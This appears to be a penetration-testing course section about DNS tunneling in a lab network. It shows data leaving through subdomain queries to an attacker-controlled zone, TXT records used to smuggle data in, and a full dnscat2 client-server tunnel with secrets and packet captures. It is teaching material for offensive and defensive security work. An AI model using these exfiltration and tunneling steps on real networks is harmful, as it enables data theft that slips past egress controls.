### Network Configuration and DNS Settings

**Link 4 (ens192)**
- **Current Scopes:** DNS
- **DefaultRoute setting:** Yes
- **LLMNR setting:** Yes
- **MulticastDNS setting:** No
- **DNSOverTLS setting:** No
- **DNSSEC setting:** No
- **DNSSEC supported:** No
- **Current DNS Server:** 10.4.50.64
- **DNS Servers:** 10.4.50.64

### Checking the Configured DNS Server on PGDATABASE01

PGDATABASE01’s DNS server is set to 10.4.50.64 (MULTISERVER03). It will query MULTISERVER03 whenever it needs a domain name resolved. However, PGDATABASE01 has no outgoing network connectivity, so it cannot communicate directly with FELINEAUTHORITY or our Kali machine.

### Experiment: Using `nslookup` to Make a DNS Request

```bash
database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
Server: 127.0.0.53
Address: 127.0.0.53#53
** server can't find exfiltrated-data.feline.corp: NXDOMAIN
```

This returns an `NXDOMAIN` response, indicating that the DNS request failed. This is expected as we haven’t configured our DNS server to serve any records. The `nslookup` command used the DNS server running on the localhost interface (127.0.0.53), which is the DNS resolver provided by the `systemd-resolved` service running on Ubuntu. It will forward the query to the DNS server configured by Netplan. If we receive outdated DNS responses, we should flush the local DNS cache using `resolvectl flush-caches`. We can also query the DNS server directly by appending the server address to the `nslookup` command, for example:

```bash
nslookup exfiltrated-data.feline.corp 192.168.50.64
```

### Capturing DNS Packets with `tcpdump`

The `tcpdump` program on FELINEAUTHORITY captured DNS packets from MULTISERVER03.

```bash
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A?
exfiltrated-data.feline.corp. (57)
04:57:40.721786 IP 192.168.118.4.domain > 192.168.50.64.65122: 26234 NXDomain 0/0/1 (57)
```

In this case, we received a DNS A record request for `exfiltrated-data.feline.corp` on FELINEAUTHORITY. This happened because MULTISERVER03 determined the authoritative name server for the `feline.corp` zone. All requests for any subdomain of `feline.corp` will be forwarded to FELINEAUTHORITY. Since we didn’t configure Dnsmasq on FELINEAUTHORITY to handle requests for `exfiltrated-data.feline.corp`, Dnsmasq returned an `NXDomain` response.

### Data Exfiltration via DNS

An arbitrary DNS query from an internal host (with no other outbound connectivity) has found its way to an external server we control. This illustrates that we can transfer small amounts of information (exfiltrated data) from inside the network to the outside without a direct connection, just by making DNS queries.

To exfiltrate a binary file from PGDATABASE01, we could convert the binary file into a long hex string representation, split this string into a series of smaller chunks, and send each chunk in a DNS request for `[hex-string-chunk].feline.corp`. On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary.

### Data Infiltration via DNS

The DNS specification includes various records, such as A, TXT, and others. We have been making A record requests so far, but TXT records can be used to smuggle arbitrary data into a network. TXT records are designed to be general-purpose and contain "arbitrary string information."

We can serve TXT records from FELINEAUTHORITY using Dnsmasq. First, we’ll kill our previous Dnsmasq process and then check the contents of `dnsmasq_txt.conf` and run Dnsmasq again with this new configuration.

```bash
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts
# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
```

The `dnsmasq_txt.conf` contains two extra lines starting with `txt-record=`. Each line represents a TXT record that Dnsmasq will serve. Each contains the domain the TXT record is for, followed by an arbitrary string attribute, separated by a comma. From these two definitions, any TXT record requests for `www.feline.corp` should return the strings "here's something useful!" and "here's something else less useful."

Let’s test this hypothesis. Back on PGDATABASE01, we’ll make a request for TXT records for `www.feline.corp` with `nslookup` by passing the `-type=txt` argument.

```bash
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server: 192.168.50.64
Address: 192.168.50.64#53
Non-authoritative answer:
www.feline.corp text = "here's something useful!"
www.feline.corp text = "here's something else less useful."
Authoritative answers can be found from:
```

Success! We received the arbitrary string attributes that were defined in `dnsmasq_txt.conf`. This is one way to get data into an internal network using DNS records. If we wanted to infiltrate binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records and convert that back into binary on the internal server.

### DNS Tunneling with `dnscat2`

We can use `dnscat2` to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records. A `dnscat2` server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.

#### Starting `dnscat2` Server

```bash
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
kali@felineauthority:~$ dnscat2-server feline.corp
New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.
auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):
./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp
To talk directly to the server without a domain name, run:
./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7
Of course, you have to figure out x.x.x.x yourself! Clients
will connect directly on UDP port 53.
dnscat2>
```

#### Running `dnscat2` Client on PGDATABASE01

```bash
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
domain = feline.corp
host = 0.0.0.0
port = 53
type = TXT,CNAME,MX
server = 127.0.0.53
Encrypted session established! For added security, please verify the server also
displays this string:
Annoy Mona Spiced Outran Stump Visas
Session established!
```

The `dnscat2` client reports that a session has been established. We can check for connections back on our `dnscat2` server.

```bash
kali@felineauthority:~$ dnscat2-server feline.corp
[sudo] password for kali:
New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.
auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):
./dnscat --secret=7a87a5d0a8480b080896606df6b63944 feline.corp
To talk directly to the server without a domain name, run:
./dnscat --dns server=x.x.x.x,port=53 --secret=7a87a5d0a8480b080896606df6b63944
Of course, you have to figure out x.x.x.x yourself! Clients
will connect directly on UDP port 53.
dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:
>> Annoy Mona Spiced Outran Stump Visas
dnscat2>
```

Our session is connected! DNS is working exactly as expected. Requests from PGDATABASE01 are being resolved by MULTISERVER03 and end up on FELINEAUTHORITY.

When run without a pre-shared `--secret` flag at each end, `dnscat2` will print an authentication string. This is used to verify the connection integrity after the encryption has been negotiated. The authentication string in this case ("Annoy Mona Spiced Outran Stump Visas") is the same on both client and server, so we know there’s no in-line tampering. Every time a connection is made, the authentication string will change.

We can use our `tcpdump` process to monitor the DNS requests to `feline.corp`:

```bash
...
07:22:14.732111 IP 192.168.50.64.51077 > 192.168.118.4.domain: 29066+ [1au] TXT?
8f150140b65c73af271ce019c1ede35d28.feline.corp. (75)
07:22:14.732538 IP 192.168.118.4.domain > 192.168.50.64.51077: 29066 1/0/0 TXT
"b40d0140b6a895ada18b30ffff0866c42a" (111)
07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME?
bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME
a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME?
38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME
e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX?
8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX
385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX?
68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX
d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)
```

### Conclusion

In this section, we discussed how to infiltrate and exfiltrate data through various types of DNS records. We also demonstrated how to use `dnscat2` to create a multipurpose DNS tunnel.